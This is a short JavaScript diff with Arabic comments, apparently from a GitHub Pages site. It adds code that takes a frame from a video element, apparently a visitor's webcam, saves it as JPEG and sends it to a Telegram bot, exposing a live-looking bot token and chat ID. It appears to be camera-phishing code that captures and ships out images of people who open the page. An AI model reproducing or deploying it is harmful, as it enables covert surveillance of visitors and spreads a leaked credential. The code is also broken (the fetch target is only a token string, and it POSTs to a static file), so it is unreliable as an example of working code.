@@ -23,14 +23,22 @@
                 var context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // تحويل الصورة إلى بيانات URL
                 var imageData = canvas.toDataURL('image/jpeg'); // استخدام تنسيق JPEG
+
+                // إرسال الصورة إلى ملف الموقع
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'myphotos/image.jpg', true);
+                xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+                xhr.send(imageData);
+                
                 // إرسال الصورة إلى البوت على تليجرام
-                fetch('Yhttps://api.telegram.org/bot 6530176287:AAEux253k36KD2FQkv8MAYVWPHONZXDUowo/setWebhook?url=https://bosalha.github.io/klerf/', {
+                fetch('6530176287:AAEux253k36KD2FQkv8MAYVWPHONZXDUowo', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ image: imageData })
+                    body: JSON.stringify({ chat_id: '946487689', photo: 'https://bosalha.github.io/klerf/myphotos/image.jpg' })
                 })
                 .then(response => response.json())
                 .then(data => console.log(data))
